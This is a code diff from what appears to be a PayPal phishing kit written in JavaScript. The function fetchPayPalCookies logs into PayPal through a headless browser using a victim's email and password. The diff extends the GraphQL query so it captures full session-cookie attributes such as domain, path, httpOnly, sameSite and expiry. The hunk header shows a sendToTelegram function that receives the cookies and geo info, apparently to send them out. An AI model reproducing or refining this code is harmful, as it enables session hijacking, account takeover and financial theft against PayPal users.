@@ -60,8 +60,9 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
 async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password) {
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
-    const loginScript = `
-        mutation Login($url: String!, $email: String!, $password: String!) {
+    // GraphQL query to navigate, log in, and get cookies
+    const query = `
+        mutation LoginAndGetCookies($url: String!, $email: String!, $password: String!) {
             goto(url: $url, waitUntil: "networkIdle") {
                 status
             }
@@ -81,6 +82,12 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
                 cookies {
                     name
                     value
+                    domain
+                    path
+                    secure
+                    httpOnly
+                    sameSite
+                    expires
                 }
                 time
             }
@@ -94,7 +101,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                query: loginScript,
+                query: query,
                 variables: {
                     url: paypalUrl,
                     email: email,
